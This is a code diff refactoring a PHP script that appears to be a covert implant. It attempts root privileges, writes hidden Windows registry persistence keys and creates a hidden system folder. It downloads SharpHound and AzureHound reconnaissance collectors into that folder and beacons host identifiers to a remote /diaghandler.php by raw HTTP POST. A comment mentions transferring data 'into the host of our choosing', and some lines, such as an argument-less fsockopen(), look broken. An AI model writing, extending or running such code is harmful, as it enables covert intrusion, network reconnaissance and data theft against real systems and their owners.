@@ -2,11 +2,19 @@
 ini_set("safe_mode", 0);
 umask(0);
 posix_setuid(0);
-require "vendor/autoload.php";
-use Amp\Loop;
-define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
 define("UNPACKVEND", "cat ./vend.b64 | base64 -d >> vendor.zip && unzip ./vendor.zip && rm ./vendor.zip");
 define("uuid", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32));
+define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
+try {
+    require "vendor/autoload.php";
+
+
+}catch (Exception $exception){
+    $u = null; // where we will get the base64 encoded zip file from, to transfer across the wire into the host of our choosing.
+    fsockopen();
+}
+use Amp\Loop;
+
 
 function checkfs(){
     if (substr(php_uname(), 0, 7) == 'Windows') {
@@ -17,12 +25,12 @@ function checkfs(){
             $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Version", "REG_SZ", "1");
             $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerPath", "REG_SZ", base64_encode($t));
             $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash", "REG_SZ", uuid);
-            shell_exec("mkdir " . $t);
-            shell_exec("attrib +h +s " . $t);
-            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile " . $t . "\\af.ps1");
-            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile " . $t . "\\af1.ps1");
-            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile " . $t . "\\af2.exe");
-            shell_exec("attrib +r +s $t\\*");
+            system("mkdir " . $t);
+            system("attrib +h +s " . $t);
+            system("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile " . $t . "\\af.ps1");
+            system("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile " . $t . "\\af1.ps1");
+            system("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile " . $t . "\\af2.exe");
+            system("attrib +r +s $t\\*");
             fwrite(fopen(sys_get_temp_dir()."/aa", "a"), "win");
             return $t;
         }else{
@@ -61,7 +69,7 @@ function checkfs(){
     }
 
 }
-function checkFile(){
+function checkSystems(){
 
 }
 
@@ -80,24 +88,6 @@ function mainR(){
                     "u" => uuid,
                     "o" => "windows"
                 );
-                foreach ($au AS $key => $value){
-                    $poststring .=urlencode($key) . "=" . $value . "&";
-                }
-                $poststring = substr($poststring, 0, -1);
-                if (!$fp){
-                    fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), $errstr);
-                }else{
-                    fputs($fp,"POST /diaghandler.php HTTP/1.1\r\n");
-                    fputs($fp, "Host: $ho\r\n");
-                    fputs($fp, "User-Agent: $u\r\n");
-                    fputs($fp, "Connection: close\r\n");
-                    fputs($fp, "Accept: */*\r\n");
-                    fputs($fp, $poststring."\r\n\r\n");
-                    while (!feof($fp)){
-                        fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), fgets($fp, 4096));
-                    }
-                    fclose($fp);
-                }
                 break;
             case "lin":
                 $au = array(
@@ -106,26 +96,26 @@ function mainR(){
                     "u" => uuid,
                     "o" => "lin"
                 );
-                foreach ($au AS $key => $value){
-                    $poststring .=urlencode($key) . "=" . $value . "&";
-                }
-                $poststring = substr($poststring, 0, -1);
-                if (!$fp){
-                    fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), $errstr);
-                }else{
-                    fputs($fp,"POST /diaghandler.php HTTP/1.1\r\n");
-                    fputs($fp, "Host: $ho\r\n");
-                    fputs($fp, "User-Agent: $u\r\n");
-                    fputs($fp, "Connection: close\r\n");
-                    fputs($fp, "Accept: */*\r\n");
-                    fputs($fp, $poststring."\r\n\r\n");
-                    while (!feof($fp)){
-                        fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), fgets($fp, 4096));
-                    }
-                    fclose($fp);
-                }
                 break;
 
+        }
+        foreach ($au AS $key => $value){
+            $poststring .=urlencode($key) . "=" . $value . "&";
+        }
+        $poststring = substr($poststring, 0, -1);
+        if (!$fp){
+            fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), $errstr);
+        }else{
+            fputs($fp,"POST /diaghandler.php HTTP/1.1\r\n");
+            fputs($fp, "Host: $ho\r\n");
+            fputs($fp, "User-Agent: $u\r\n");
+            fputs($fp, "Connection: close\r\n");
+            fputs($fp, "Accept: */*\r\n");
+            fputs($fp, $poststring."\r\n\r\n");
+            while (!feof($fp)){
+                fwrite(fopen(sys_get_temp_dir()."/aaF", "a"), fgets($fp, 4096));
+            }
+            fclose($fp);
         }
     });
     Loop::run(function () use($myHome){
